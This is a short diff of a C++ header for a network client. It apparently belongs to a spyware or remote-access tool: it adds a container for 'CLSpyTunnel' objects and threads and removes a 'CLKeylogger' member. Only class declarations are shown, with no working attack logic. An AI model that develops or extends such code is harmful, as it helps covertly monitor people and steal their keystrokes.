@@ -18,6 +18,18 @@
 // g++ client.cpp -o client -Os -s
 // strip client
 
+class TunnelContainer {
+public:
+    TunnelContainer(CommandCode __tunnel_code);
+    ~TunnelContainer();
+    TunnelContainer* find(CommandCode __tunnel_code);
+    CommandCode tunnel_code_;
+    CLSpyTunnel* p_tunnel_;
+    pthread_t tunnel_thread_;
+    bool thread_running_ = false;
+    TunnelContainer* next_;
+};
+
 class Client {
 public:
     Client(const char* __ip, const int __port);
@@ -31,8 +43,7 @@ private:
     bool shutdown_flag_ = false;
     bool retry_flag_ = false;
     struct sockaddr_in server_addr_;
-
-    CLKeylogger* keylogger_ = nullptr;
+    TunnelContainer* tunnel_conts_;
 };
 
 #endif // CLIENT_HPP
